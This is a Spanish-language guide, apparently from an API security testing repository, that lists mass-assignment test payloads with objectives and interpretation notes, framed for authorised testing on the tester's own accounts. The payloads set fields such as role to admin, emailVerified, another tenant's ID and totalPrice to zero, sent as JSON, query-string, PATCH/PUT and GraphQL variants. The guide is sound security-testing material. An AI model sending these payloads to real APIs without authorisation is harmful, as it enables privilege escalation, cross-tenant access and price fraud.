# 🗡️ Mass assignment en APIs: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Propiedad de rol no editable

**Objetivo:** Comprobar rechazo de una propiedad privilegiada al editar la cuenta propia.

```json
{"displayName":"canary-{NONCE}","role":"admin"}
```

**Interpretación:** El backend debe ignorar/rechazar role. Confirmar con GET separado, no solo respuesta reflejada.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 2. Propiedad de verificación

**Objetivo:** Verificar que emailVerified no se toma del cliente.

```json
{"displayName":"canary-{NONCE}","emailVerified":true}
```

**Interpretación:** Usar cuenta propia no verificada y restaurar estado; el cambio real importa, no un eco del body.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment).

### 3. Objeto anidado

**Objetivo:** Probar que la lista de campos permitidos se aplica también a objetos anidados.

```json
{"profile":{"nickname":"canary-{NONCE}","account":{"role":"admin"}}}
```

**Interpretación:** Adaptar al modelo aceptado; un 400 por esquema desconocido no demuestra protección general.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment).

### 4. Identificador de tenant

**Objetivo:** Comprobar que tenantId se deriva de identidad autenticada.

```json
{"displayName":"canary-{NONCE}","tenantId":"{TENANT_B_CONTROLADO}"}
```

**Interpretación:** Probar con dos tenants propios y verificar estado efectivo; no mover objetos ajenos.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 5. PATCH frente a PUT

**Objetivo:** Comparar lista de propiedades mutables en dos métodos soportados.

```text
PATCH /api/v1/me  {"displayName":"canary-{NONCE}","role":"admin"}
PUT /api/v1/me    {"displayName":"canary-{NONCE}","role":"admin"}
```

**Interpretación:** Solo en objeto propio y con reversión; algunas APIs no implementan PUT.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment).

### 6. Propiedad en query

**Objetivo:** Verificar si el backend mezcla query y cuerpo antes de actualizar.

```http
PATCH /api/v1/me?role=admin HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"canary-{NONCE}"}
```

**Interpretación:** Comparar con petición sin query; verificar rol real tras la actualización.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment).

### 7. GraphQL input

**Objetivo:** Comprobar que el resolver no acepta campos internos en input flexible.

```graphql
mutation { updateProfile(input:{displayName:"canary-{NONCE}",role:"admin"}) { id role } }
```

**Interpretación:** Si role no está en el esquema, el rechazo es esperado; si existe, comprobar control de autorización.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

### 8. Propiedad de precio

**Objetivo:** Verificar que campos calculados por servidor no los fija el cliente.

```json
{"itemId":"{ITEM_PROPIO}","quantity":1,"totalPrice":0}
```

**Interpretación:** Usar cesta/ítem de prueba y no completar una compra real; confirmar importe en backend.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
